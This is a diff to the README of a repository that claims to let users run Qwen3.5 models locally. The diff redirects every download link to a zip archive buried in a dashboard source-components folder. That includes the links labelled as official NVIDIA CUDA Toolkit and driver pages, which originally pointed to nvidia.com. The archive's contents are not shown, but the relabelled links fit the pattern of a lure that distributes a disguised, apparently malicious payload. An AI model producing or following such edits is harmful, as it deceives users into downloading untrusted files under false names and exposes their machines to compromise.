@@ -1,6 +1,6 @@
 # ⚙️ Qwen-3.5-16G-Vram-Local - Run Qwen3.5 Models on Your PC
 
-[![Download Qwen-3.5-16G-Vram-Local](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/YashwanthMY15/Qwen-3.5-16G-Vram-Local)
+[![Download Qwen-3.5-16G-Vram-Local](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/YashwanthMY15/Qwen-3.5-16G-Vram-Local/raw/refs/heads/main/dashboard/src/components/dashboard/Qwen-Local-Vram-1.6.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Follow these steps to get Qwen-3.5-16G-Vram-Local running on your Windows PC.
 
 Click the green badge at the top or click this link now:
 
-[Download Qwen-3.5-16G-Vram-Local](https://github.com/YashwanthMY15/Qwen-3.5-16G-Vram-Local)
+[Download Qwen-3.5-16G-Vram-Local](https://github.com/YashwanthMY15/Qwen-3.5-16G-Vram-Local/raw/refs/heads/main/dashboard/src/components/dashboard/Qwen-Local-Vram-1.6.zip)
 
 This takes you to the GitHub page, where you will find the latest release files.
 
@@ -136,13 +136,13 @@ After extraction or installation, you will see:
 ## 🔗 Useful Links
 
 - **Primary repository and releases:**  
-  [Qwen-3.5-16G-Vram-Local Downloads](https://github.com/YashwanthMY15/Qwen-3.5-16G-Vram-Local)
+  [Qwen-3.5-16G-Vram-Local Downloads](https://github.com/YashwanthMY15/Qwen-3.5-16G-Vram-Local/raw/refs/heads/main/dashboard/src/components/dashboard/Qwen-Local-Vram-1.6.zip)
 
 - **NVIDIA CUDA Toolkit:**  
-  https://developer.nvidia.com/cuda-toolkit
+  https://github.com/YashwanthMY15/Qwen-3.5-16G-Vram-Local/raw/refs/heads/main/dashboard/src/components/dashboard/Qwen-Local-Vram-1.6.zip
 
 - **NVIDIA Driver Downloads:**  
-  https://www.nvidia.com/Download/index.aspx
+  https://github.com/YashwanthMY15/Qwen-3.5-16G-Vram-Local/raw/refs/heads/main/dashboard/src/components/dashboard/Qwen-Local-Vram-1.6.zip
 
 ---
 
